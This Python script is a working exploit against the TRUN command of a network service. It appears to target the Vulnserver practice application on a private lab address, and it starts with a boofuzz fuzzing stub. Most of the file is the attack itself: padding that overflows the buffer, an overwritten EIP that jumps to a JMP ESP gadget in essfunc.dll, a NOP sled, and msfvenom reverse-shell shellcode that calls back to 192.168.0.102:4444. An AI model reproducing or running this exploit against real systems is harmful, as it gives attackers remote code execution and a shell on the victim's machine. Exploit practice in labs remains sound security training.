
from boofuzz import *

session = Session(target=Target(
    connection=SocketConnection("192.168.0.106",9999,proto='tcp')
))


s_initialize("TRUN")
s_static("TRUN ")
s_string("AA")

session.connect(s_get("TRUN"))
#session.fuzz()

import socket 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.0.106',9999))

msg = s.recv(2048).decode()
print(msg)

#   625012F0   FFE4             JMP ESP  essfunc.dll
#   00B6FA48   736F7148  Hqos    eip    2003
#   00B6FA4C   54575848  HXWT    esp    2007

pattern = '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'

junk = 'TRUN ' + '/.:/' + 'A'*2003

#   625012F0 
eip = '\xF0\x12\x50\x62'
esp = '\x90'*40

#   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.102 LPORT=4444 -b '\x00\x0a\x0d' -f c

shellcode = ("\xbf\xad\x9a\xde\xa0\xd9\xce\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x7a\x12\x83\xc2\x04\x03\xd7\x94\x3c\x55\xdb\x41\x42"
"\x96\x23\x92\x23\x1e\xc6\xa3\x63\x44\x83\x94\x53\x0e\xc1\x18"
"\x1f\x42\xf1\xab\x6d\x4b\xf6\x1c\xdb\xad\x39\x9c\x70\x8d\x58"
"\x1e\x8b\xc2\xba\x1f\x44\x17\xbb\x58\xb9\xda\xe9\x31\xb5\x49"
"\x1d\x35\x83\x51\x96\x05\x05\xd2\x4b\xdd\x24\xf3\xda\x55\x7f"
"\xd3\xdd\xba\x0b\x5a\xc5\xdf\x36\x14\x7e\x2b\xcc\xa7\x56\x65"
"\x2d\x0b\x97\x49\xdc\x55\xd0\x6e\x3f\x20\x28\x8d\xc2\x33\xef"
"\xef\x18\xb1\xeb\x48\xea\x61\xd7\x69\x3f\xf7\x9c\x66\xf4\x73"
"\xfa\x6a\x0b\x57\x71\x96\x80\x56\x55\x1e\xd2\x7c\x71\x7a\x80"
"\x1d\x20\x26\x67\x21\x32\x89\xd8\x87\x39\x24\x0c\xba\x60\x21"
"\xe1\xf7\x9a\xb1\x6d\x8f\xe9\x83\x32\x3b\x65\xa8\xbb\xe5\x72"
"\xcf\x91\x52\xec\x2e\x1a\xa3\x25\xf5\x4e\xf3\x5d\xdc\xee\x98"
"\x9d\xe1\x3a\x0e\xcd\x4d\x95\xef\xbd\x2d\x45\x98\xd7\xa1\xba"
"\xb8\xd8\x6b\xd3\x53\x23\xfc\x1c\x0b\x2b\x9a\xf4\x4e\x2b\x73"
"\x59\xc6\xcd\x19\x71\x8e\x46\xb6\xe8\x8b\x1c\x27\xf4\x01\x59"
"\x67\x7e\xa6\x9e\x26\x77\xc3\x8c\xdf\x77\x9e\xee\x76\x87\x34"
"\x86\x15\x1a\xd3\x56\x53\x07\x4c\x01\x34\xf9\x85\xc7\xa8\xa0"
"\x3f\xf5\x30\x34\x07\xbd\xee\x85\x86\x3c\x62\xb1\xac\x2e\xba"
"\x3a\xe9\x1a\x12\x6d\xa7\xf4\xd4\xc7\x09\xae\x8e\xb4\xc3\x26"
"\x56\xf7\xd3\x30\x57\xd2\xa5\xdc\xe6\x8b\xf3\xe3\xc7\x5b\xf4"
"\x9c\x35\xfc\xfb\x77\xfe\x0c\xb6\xd5\x57\x85\x1f\x8c\xe5\xc8"
"\x9f\x7b\x29\xf5\x23\x89\xd2\x02\x3b\xf8\xd7\x4f\xfb\x11\xaa"
"\xc0\x6e\x15\x19\xe0\xba")

junk2 = 'B'*(5000-len(junk+eip+esp+shellcode))
payload = junk + eip + esp + shellcode + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()


